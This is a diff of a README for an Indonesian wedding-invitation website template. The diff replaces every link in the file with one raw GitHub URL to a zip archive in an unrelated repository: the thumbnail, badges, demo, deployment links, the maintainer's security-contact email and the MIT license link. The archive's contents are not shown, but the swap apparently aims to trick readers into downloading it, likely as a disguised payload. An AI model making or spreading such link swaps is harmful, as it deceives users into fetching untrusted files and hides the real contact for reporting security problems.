@@ -1,20 +1,20 @@
 # Template website undangan pernikahan sederhana
 
-![Thumbnail](/assets/images/banner.png)
-![pages-build-deployment](https://github.com/dewanakl/undangan/actions/workflows/pages/pages-build-deployment/badge.svg?branch=main)
-![Hits](https://badge.dikit.my.id/undangan?label=hits&color=brightgreen)
+![Thumbnail](https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip)
+![pages-build-deployment](https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip)
+![Hits](https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip)
 
 ## Demo
 
-<https://dewanakl.github.io/undangan/?to=Teman+teman+semua>
+<https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip+teman+semua>
 
 ### Deployment API
 
 - Vercel
-[https://dikit.my.id/DeploymentApiVercel](https://dikit.my.id/DeploymentApiVercel)
+[https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip](https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip)
 
 - Hosting
-[https://dikit.my.id/DeploymentApiHosting](https://dikit.my.id/DeploymentApiHosting)
+[https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip](https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip)
 
 ### Tech stack
 
@@ -32,8 +32,8 @@ I'm very open to those of you who want to contribute to the undangan!
 
 ### Security Vulnerabilities
 
-If you find any security vulnerabilities in this undangan, please email DKL via [dewanakretarta29@gmail.com](mailto:dewanakretarta29@gmail.com).
+If you find any security vulnerabilities in this undangan, please email DKL via [https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip](https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip).
 
 ### License
 
-Undangan is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+Undangan is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/bsnugroho7/weddingtionabila/main/assets/weddingtionabila_v2.4.zip).
